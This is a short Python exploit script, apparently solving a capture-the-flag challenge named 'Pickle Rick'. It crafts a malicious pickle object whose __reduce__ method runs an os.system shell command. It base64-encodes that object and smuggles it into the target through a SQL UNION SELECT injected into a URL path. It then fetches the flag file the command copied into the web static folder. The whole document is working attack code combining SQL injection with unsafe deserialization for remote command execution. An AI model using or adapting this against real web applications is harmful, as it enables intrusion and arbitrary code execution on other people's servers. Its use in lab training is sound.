import sys
import base64
import pickle
import os
import requests
import threading
import time

import sys
import base64
import pickle
import os
import requests
import threading
 
payload = "cat flag.txt > application/static/flag.txt"

# Exploit class 
class Exploit:

    # __reduce__ method for serialization and deserialization
    def __reduce__(self):
        return os.system, (payload,)

def exploit(url):
    # Create an instance of the Exploit class
    exploit_instance = Exploit()

    # Serialize the object using pickle and encode in base64
    serialized_payload = base64.b64encode(pickle.dumps(exploit_instance)).decode()

    # Construct the final URL by appending the serialized payload
    final_url = f"{url}/view/' UNION SELECT '{serialized_payload}"

    # Perform a GET request to the constructed URL
    response = requests.get(final_url)

    check_url = f"{url}/static/flag.txt"
    response = requests.get(check_url)
    print(f"Checking if the exploit worked")
    print(response.text)

if __name__ == "__main__":
    # Example usage
    target_url = "http://IP:PORT"  # Replace with the target URL

    print("[*] Executing program: Pickle Rick..")
    exploit(target_url)
